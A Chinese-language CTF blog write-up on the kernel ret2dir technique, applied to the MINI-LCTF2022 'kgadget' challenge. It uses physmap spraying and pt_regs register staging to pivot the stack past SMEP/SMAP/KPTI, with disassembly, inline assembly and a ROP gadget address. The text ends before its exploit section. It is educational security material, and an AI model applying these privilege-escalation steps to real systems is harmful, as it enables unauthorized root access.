<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="baidu-site-verification" content="codeva-ROfYcqLkCh" />
    <meta name="msvalidate.01" content="ECA3E06A0E52A2AC90C4B06F12981FB2" />
    <meta name="description" content="return to direct-mapped memory绕过smep smap保护等用户空间与内核空间隔离的防护手段 查看linux x86虚拟内存布局 https:&#x2F;&#x2F;elixir.bootlin.com&#x2F;linux&#x2F;v5.19.17&#x2F;source&#x2F;Documentation&#x2F;x86&#x2F;x86_64&#x2F;mm.rst 里面存在一块direct mapping of all physical mem">
<meta property="og:type" content="article">
<meta property="og:title" content="Kernel Ret2dir">
<meta property="og:url" content="https://grxer.gitee.io/2023/08/22/kernel-ret2dir/index.html">
<meta property="og:site_name" content="Grxer&#39;s Blog">
<meta property="og:description" content="return to direct-mapped memory绕过smep smap保护等用户空间与内核空间隔离的防护手段 查看linux x86虚拟内存布局 https:&#x2F;&#x2F;elixir.bootlin.com&#x2F;linux&#x2F;v5.19.17&#x2F;source&#x2F;Documentation&#x2F;x86&#x2F;x86_64&#x2F;mm.rst 里面存在一块direct mapping of all physical mem">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://grxer.gitee.io/2023/08/22/kernel-ret2dir/image-20230820153202390.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/08/22/kernel-ret2dir/image-20230820102303460.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/08/22/kernel-ret2dir/image-20230820154114405.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/08/22/kernel-ret2dir/image-20230820170432061.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/08/22/kernel-ret2dir/image-20230823153602727.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/08/22/kernel-ret2dir/image-20230823153135353.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/08/22/kernel-ret2dir/image-20230823181758556.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/08/22/kernel-ret2dir/image-20230828094130225.png">
<meta property="article:published_time" content="2023-08-22T14:47:22.000Z">
<meta property="article:modified_time" content="2023-08-31T07:18:11.995Z">
<meta property="article:author" content="bxz">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://grxer.gitee.io/2023/08/22/kernel-ret2dir/image-20230820153202390.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Kernel Ret2dir</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 lrt">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/08/28/2023wmctf/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/08/17/2023NepCTF/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/08/22/kernel-ret2dir/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/08/22/kernel-ret2dir/&text=Kernel Ret2dir"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/08/22/kernel-ret2dir/&title=Kernel Ret2dir"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/08/22/kernel-ret2dir/&is_video=false&description=Kernel Ret2dir"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Kernel Ret2dir&body=Check out this article: https://grxer.gitee.io/2023/08/22/kernel-ret2dir/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/08/22/kernel-ret2dir/&title=Kernel Ret2dir"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/08/22/kernel-ret2dir/&title=Kernel Ret2dir"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/08/22/kernel-ret2dir/&title=Kernel Ret2dir"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/08/22/kernel-ret2dir/&title=Kernel Ret2dir"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/08/22/kernel-ret2dir/&name=Kernel Ret2dir&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/08/22/kernel-ret2dir/&t=Kernel Ret2dir"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#return-to-direct-mapped-memory"><span class="toc-number">1.</span> <span class="toc-text">return to direct-mapped memory</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MINI-LCTF2022-kgadget"><span class="toc-number">1.1.</span> <span class="toc-text">MINI-LCTF2022 - kgadget</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.1.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.2.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Kernel Ret2dir
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">bxz</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-08-22T14:47:22.000Z" itemprop="datePublished">2023-08-22</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="return-to-direct-mapped-memory"><a href="#return-to-direct-mapped-memory" class="headerlink" title="return to direct-mapped memory"></a>return to direct-mapped memory</h1><p>绕过smep smap保护等用户空间与内核空间隔离的防护手段</p>
<p>查看linux x86虚拟内存布局 <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.19.17/source/Documentation/x86/x86_64/mm.rst">https://elixir.bootlin.com/linux/v5.19.17/source/Documentation/x86/x86_64/mm.rst</a></p>
<p>里面存在一块direct mapping of all physical memory的虚拟内存<strong>线性地直接映射了整个或部分物理内存空间</strong>，这块区域也叫<strong>physmap</strong></p>
<p><img src="/2023/08/22/kernel-ret2dir/image-20230820153202390.png" alt="image-20230820153202390"></p>
<p><img src="/2023/08/22/kernel-ret2dir/image-20230820102303460.png" alt="image-20230820102303460"></p>
<p>Linux在x86-64架构是直接映射了整个物理内存到这块区域(上面图片是48位虚拟内存4级页表的情况)，所有就可以利用这块区域访问到在用户空间布置的一些payload，新版本这块直接映射区没有执行权限，只能rop</p>
<p><img src="/2023/08/22/kernel-ret2dir/image-20230820154114405.png" alt="image-20230820154114405"></p>
<h2 id="MINI-LCTF2022-kgadget"><a href="#MINI-LCTF2022-kgadget" class="headerlink" title="MINI-LCTF2022 - kgadget"></a><a target="_blank" rel="noopener" href="https://arttnba3.cn/download/minil2022/pwn/kgadget.tar.xz">MINI-LCTF2022 - kgadget</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/k/kgadget&gt; file bzImage</span><br><span class="line">bzImage: Linux kernel x86 boot executable bzImage, version 5.10.112 (arttnba3@ubuntu) #1 SMP Thu Apr 21 19:47:35 +08 2022, RO-rootFS, swap_dev 0X9, Normal VGA</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/k/k/rootfs&gt; cpio -idmv &lt; rootfs.cpio</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/k/kgadget&gt; checksec kgadget.ko</span><br><span class="line">[*] &#x27;/home/grxer/kernel-env/kgadget/kgadget.ko&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>

<p>init脚本里限制了demsg和&#x2F;proc&#x2F;kallsystem</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/kernel/kptr_restrict</span><br></pre></td></tr></table></figure>

<p>run.sh开了smep smap kpti，没开kaslr，可以通过vmlinux获取函数地址和gadget位置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-cpu kvm64,+smep,+smap \</span><br><span class="line">-append &quot;console=ttyS0 nokaslr pti=on quiet oops=panic panic=1&quot; \</span><br></pre></td></tr></table></figure>

<p>没有给vmlinux需要从bzImage里恢复,两种方法</p>
<ul>
<li>extract-vmlinux ps：这道题用这个没恢复出来符号表</li>
<li>vmlinux-to-elf</li>
</ul>
<p>file_operations结构体里重写了下面的函数</p>
<p><img src="/2023/08/22/kernel-ret2dir/image-20230820170432061.png" alt="image-20230820170432061"></p>
<p>ioctl函数伪代码不太好看，直接看汇编</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">text.unlikely:<span class="number">00000000000000F</span>3                               ; __int64 __fastcall <span class="title function_">kgadget_ioctl</span><span class="params">(file *__file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> __int64 param)</span></span><br><span class="line">.text.unlikely:00000000000000F3                               kgadget_ioctl proc near                 ; DATA XREF: __mcount_loc:<span class="number">0000000000000653</span>↓o</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3                                                                       ; .data:kgadget_fo↓o</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3                               regs_addr= qword ptr <span class="number">-20</span>h</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3                               __file = rdi                            ; file *</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3                               cmd = rsi                               ; <span class="type">unsigned</span> <span class="type">int</span></span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3                               param = rdx                             ; <span class="type">unsigned</span> __int64</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3 E8 <span class="number">40</span> <span class="number">0F</span> <span class="number">00</span> <span class="number">00</span>                call    __fentry__                      ; PIC mode</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>8 <span class="number">55</span>                            push    rbp</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>9 <span class="number">48</span> <span class="number">89</span> E5                      mov     rbp, rsp</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>C <span class="number">53</span>                            push    rbx</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>D <span class="number">48</span> <span class="number">83</span> EC <span class="number">10</span>                   sub     rsp, <span class="number">10</span>h</span><br><span class="line">.text.unlikely:<span class="number">0000000000000101</span> <span class="number">65</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">04</span> <span class="number">25</span> <span class="number">28</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov     rax, gs:<span class="number">28</span>h</span><br><span class="line">.text.unlikely:<span class="number">000000000000010</span>A <span class="number">48</span> <span class="number">89</span> <span class="number">45</span> F0                   mov     [rbp<span class="number">-10</span>h], rax</span><br><span class="line">.text.unlikely:<span class="number">000000000000010</span>E <span class="number">31</span> C0                         xor     eax, eax</span><br><span class="line">.text.unlikely:<span class="number">0000000000000110</span> <span class="number">81</span> FE <span class="number">52</span> BF <span class="number">01</span> <span class="number">00</span>             cmp     esi, <span class="number">1B</span>F52h</span><br><span class="line">.text.unlikely:<span class="number">0000000000000116</span> <span class="number">0F</span> <span class="number">85</span> <span class="number">87</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>             jnz     loc_1A3</span><br><span class="line">.text.unlikely:<span class="number">0000000000000116</span></span><br><span class="line">.text.unlikely:<span class="number">000000000000011</span>C <span class="number">48</span> <span class="number">8B</span> <span class="number">1</span>A                      mov     rbx, [param]</span><br><span class="line">.text.unlikely:<span class="number">000000000000011F</span>                               kgadget_ptr = rbx                       ; <span class="type">void</span> (*)(<span class="type">void</span>)</span><br><span class="line">.text.unlikely:<span class="number">000000000000011F</span> <span class="number">48</span> C7 C7 <span class="number">70</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>          mov     __file, offset unk_370</span><br><span class="line">.text.unlikely:<span class="number">0000000000000126</span> <span class="number">48</span> <span class="number">89</span> DE                      mov     cmd, kgadget_ptr</span><br><span class="line">.text.unlikely:<span class="number">0000000000000129</span> E8 <span class="number">2</span>A <span class="number">0F</span> <span class="number">00</span> <span class="number">00</span>                call    printk                          ; PIC mode</span><br><span class="line">.text.unlikely:<span class="number">0000000000000129</span></span><br><span class="line">.text.unlikely:<span class="number">000000000000012</span>E <span class="number">48</span> C7 C7 A0 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>          mov     rdi, offset unk_3A0</span><br><span class="line">.text.unlikely:<span class="number">0000000000000135</span> E8 <span class="number">1</span>E <span class="number">0F</span> <span class="number">00</span> <span class="number">00</span>                call    printk                          ; PIC mode</span><br><span class="line">.text.unlikely:<span class="number">0000000000000135</span></span><br><span class="line">.text.unlikely:<span class="number">000000000000013</span>A <span class="number">48</span> <span class="number">89</span> <span class="number">65</span> E8                   mov     [rbp<span class="number">-18</span>h], rsp</span><br><span class="line">.text.unlikely:<span class="number">000000000000013</span>E <span class="number">48</span> <span class="number">8B</span> <span class="number">45</span> E8                   mov     rax, [rbp<span class="number">-18</span>h]</span><br><span class="line">.text.unlikely:<span class="number">0000000000000142</span> <span class="number">48</span> C7 C7 F8 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>          mov     rdi, offset unk_3F8</span><br><span class="line">.text.unlikely:<span class="number">0000000000000149</span> <span class="number">48</span> <span class="number">05</span> <span class="number">00</span> <span class="number">10</span> <span class="number">00</span> <span class="number">00</span>             add     rax, <span class="number">1000</span>h</span><br><span class="line">.text.unlikely:<span class="number">000000000000014F</span> <span class="number">48</span> <span class="number">25</span> <span class="number">00</span> F0 FF FF             and     rax, <span class="number">0F</span>FFFFFFFFFFFF000h</span><br><span class="line">.text.unlikely:<span class="number">0000000000000155</span> <span class="number">48</span> <span class="number">8</span>D <span class="number">90</span> <span class="number">58</span> FF FF FF          lea     rdx, [rax<span class="number">-0</span>A8h]</span><br><span class="line">.text.unlikely:<span class="number">000000000000015</span>C <span class="number">48</span> <span class="number">89</span> <span class="number">55</span> E8                   mov     [rbp<span class="number">-18</span>h], rdx</span><br><span class="line">.text.unlikely:<span class="number">0000000000000160</span>                               regs = rdx                              ; pt_regs *</span><br><span class="line">.text.unlikely:<span class="number">0000000000000160</span> <span class="number">48</span> BA <span class="number">61</span> <span class="number">72</span> <span class="number">74</span> <span class="number">74</span> <span class="number">6</span>E <span class="number">62</span> <span class="number">61</span> <span class="number">33</span> mov     regs, <span class="string">&#x27;3abnttra&#x27;</span></span><br><span class="line">.text.unlikely:<span class="number">000000000000016</span>A <span class="number">48</span> <span class="number">89</span> <span class="number">90</span> <span class="number">58</span> FF FF FF          mov     [rax<span class="number">-0</span>A8h], rdx</span><br><span class="line">.text.unlikely:<span class="number">0000000000000171</span> <span class="number">48</span> <span class="number">89</span> <span class="number">90</span> <span class="number">60</span> FF FF FF          mov     [rax<span class="number">-0</span>A0h], rdx</span><br><span class="line">.text.unlikely:<span class="number">0000000000000178</span> <span class="number">48</span> <span class="number">89</span> <span class="number">90</span> <span class="number">68</span> FF FF FF          mov     [rax<span class="number">-98</span>h], rdx</span><br><span class="line">.text.unlikely:<span class="number">000000000000017F</span> <span class="number">48</span> <span class="number">89</span> <span class="number">90</span> <span class="number">70</span> FF FF FF          mov     [rax<span class="number">-90</span>h], rdx</span><br><span class="line">.text.unlikely:<span class="number">0000000000000186</span> <span class="number">48</span> <span class="number">89</span> <span class="number">90</span> <span class="number">78</span> FF FF FF          mov     [rax<span class="number">-88</span>h], rdx</span><br><span class="line">.text.unlikely:<span class="number">000000000000018</span>D <span class="number">48</span> <span class="number">89</span> <span class="number">50</span> <span class="number">80</span>                   mov     [rax<span class="number">-80</span>h], rdx</span><br><span class="line">.text.unlikely:<span class="number">0000000000000191</span> <span class="number">48</span> <span class="number">89</span> <span class="number">50</span> <span class="number">90</span>                   mov     [rax<span class="number">-70</span>h], rdx</span><br><span class="line">.text.unlikely:<span class="number">0000000000000195</span> E8 BE <span class="number">0</span>E <span class="number">00</span> <span class="number">00</span>                call    printk                          ; PIC mode</span><br><span class="line">.text.unlikely:<span class="number">0000000000000195</span></span><br><span class="line">.text.unlikely:<span class="number">000000000000019</span>A E8 B1 <span class="number">0</span>E <span class="number">00</span> <span class="number">00</span>                call    __x86_indirect_thunk_rbx        ; PIC mode</span><br></pre></td></tr></table></figure>

<p>会把ioctl第三个参数里的值当作函数指针去调用，所以可以在用户态布置提权rop链，同时我们可以在内核态从线性映射区那里访问到嘛，利用mmap申请且布置很多gadget内核访问到的机率就大的多</p>
<blockquote>
<p>可以mmap申请后，gdb里用find命令去找下，验证下内核访问</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find 0xffff888000000000,+0x10000000,&quot;target strings&quot;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>现在需要解决的一个问题就是怎么把栈迁移到可以访问到用户态的线性映射区?</p>
<p><strong>先了解下一点没开kpit时的syscall(开了pit还需要切换cr3，换页表)</strong></p>
<p>syscall会把syscall的下一条指令地址即rip保存到rcx，rflags保存到 r11中，后执行到entry_SYSCALL_64 </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ENTRY(entry_SYSCALL_64)</span><br><span class="line"> <span class="comment">/* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */</span></span><br><span class="line"> SWAPGS_UNSAFE_STACK</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* 保存栈值，并设置内核栈 */</span></span><br><span class="line"> movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line"> movq <span class="title function_">PER_CPU_VAR</span><span class="params">(cpu_current_top_of_stack)</span>, %rsp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 通过push保存寄存器值，形成一个pt_regs结构 */</span></span><br><span class="line"><span class="comment">/* Construct struct pt_regs on stack */</span></span><br><span class="line">pushq  $__USER_DS      <span class="comment">/* pt_regs-&gt;ss */</span></span><br><span class="line">pushq  <span class="title function_">PER_CPU_VAR</span><span class="params">(rsp_scratch)</span>  <span class="comment">/* pt_regs-&gt;sp */</span></span><br><span class="line">pushq  %r11             <span class="comment">/* pt_regs-&gt;flags */</span></span><br><span class="line">pushq  $__USER_CS      <span class="comment">/* pt_regs-&gt;cs */</span></span><br><span class="line">pushq  %rcx             <span class="comment">/* pt_regs-&gt;ip */</span></span><br><span class="line">pushq  %rax             <span class="comment">/* pt_regs-&gt;orig_ax */</span></span><br><span class="line">pushq  %rdi             <span class="comment">/* pt_regs-&gt;di */</span></span><br><span class="line">pushq  %rsi             <span class="comment">/* pt_regs-&gt;si */</span></span><br><span class="line">pushq  %rdx             <span class="comment">/* pt_regs-&gt;dx */</span></span><br><span class="line">pushq  %rcx tuichu    <span class="comment">/* pt_regs-&gt;cx */</span></span><br><span class="line">pushq  $-ENOSYS        <span class="comment">/* pt_regs-&gt;ax */</span></span><br><span class="line">pushq  %r8              <span class="comment">/* pt_regs-&gt;r8 */</span></span><br><span class="line">pushq  %r9              <span class="comment">/* pt_regs-&gt;r9 */</span></span><br><span class="line">pushq  %r10             <span class="comment">/* pt_regs-&gt;r10 */</span></span><br><span class="line">pushq  %r11             <span class="comment">/* pt_regs-&gt;r11 */</span></span><br><span class="line">sub $<span class="params">(<span class="number">6</span>*<span class="number">8</span>)</span>, %rsp      <span class="comment">/* pt_regs-&gt;bp, bx, r12-15 not saved */</span></span><br><span class="line">.......</span><br></pre></td></tr></table></figure>

<p>通过一系列的push在内核栈上形成一个pt_regs结构体</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* arch/x86/include/asm/ptrace.h */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>所以我们可以在用户态控制这部分寄存器值，从而控制内核栈上的值，然后通过<code>add rsp,val,ret和pop rsp，ret</code>来实现栈迁移</p>
<p>本题里除r8，r9寄存器其余都被破坏了，不过两个寄存器也够了</p>
<p>先利用<code>add rsp,val,ret</code>把栈降到r9寄存器的位置，r9寄存器里存放<code>pop rsp,ret</code>的gadget，<code>pop rsp</code>完成栈迁移到r8里的值,ret执行迁移处的内容，所以r8里就存猜测的physmap地址</p>
<p>用下面的代码测试，断点断到最后执行 call __x86_indirect_thunk_rbx的ret</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">    &quot;mov r15,   0xbeefdead;&quot;</span><br><span class="line">    &quot;mov r14,   0x11111111;&quot;</span><br><span class="line">    &quot;mov r13,   0x22222222;&quot;</span><br><span class="line">    &quot;mov r12,   0x33333333;&quot;</span><br><span class="line">    &quot;mov rbp,   0x44444444;&quot;</span><br><span class="line">    &quot;mov rbx,   0x55555555;&quot;</span><br><span class="line">    &quot;mov r11,   0x66666666;&quot;</span><br><span class="line">    &quot;mov r10,   0x77777777;&quot;</span><br><span class="line">    &quot;mov r9,    0x999999999;&quot;   </span><br><span class="line">    &quot;mov r8,    0x888888888;&quot;</span><br><span class="line">    &quot;mov rax,   0x10;&quot;</span><br><span class="line">    &quot;mov rcx,   0xaaaaaaaa;&quot;</span><br><span class="line">    &quot;mov rdx,   0x33;&quot;</span><br><span class="line">    &quot;mov rsi,   0x1bf52;&quot;</span><br><span class="line">    &quot;mov rdi,   fd;&quot;</span><br><span class="line">    &quot;syscall&quot;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>__x86_indirect_thunk_rbx最后实现调用</p>
<p><img src="/2023/08/22/kernel-ret2dir/image-20230823153602727.png" alt="image-20230823153602727"></p>
</blockquote>
<p><img src="/2023/08/22/kernel-ret2dir/image-20230823153135353.png" alt="image-20230823153135353"></p>
<p>所以需要add rsp, 0xc0，找到了一条平替的gadget</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xffffffff810737fe: add rsp, 0xa0; pop rbx; pop r12; pop r13; pop rbp; ret;</span><br></pre></td></tr></table></figure>

<p>由于开了pti，提权后返回用户态起rootshell前需要切换cr3</p>
<p>内核空间的PGD和用户空间的PGD连续的放置在一个8KB的内存空间中（内核态在低位，用户态在高位）。这段空间必须是8K对齐的，这样将CR3的切换操作转换为将CR3值的第13位(由低到高)的置位或清零操作，提高了CR3切换的速度。</p>
<p><img src="/2023/08/22/kernel-ret2dir/image-20230823181758556.png" alt="image-20230823181758556"></p>
<p>切换到用户页表把第13位置1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;SWITCH_USER_CR3</span><br><span class="line">mov     rdi, cr3</span><br><span class="line">or      rdi, 1000h</span><br><span class="line">mov     cr3, rdi</span><br></pre></td></tr></table></figure>

<p>没有合适gadget来利用</p>
<p>由于没开kaslr，可以用swapgs_restore_regs_and_return_to_usermode函数来返回,这里从恢复的vmlinux看的话，vmlinux应该是恢复的有点问题</p>
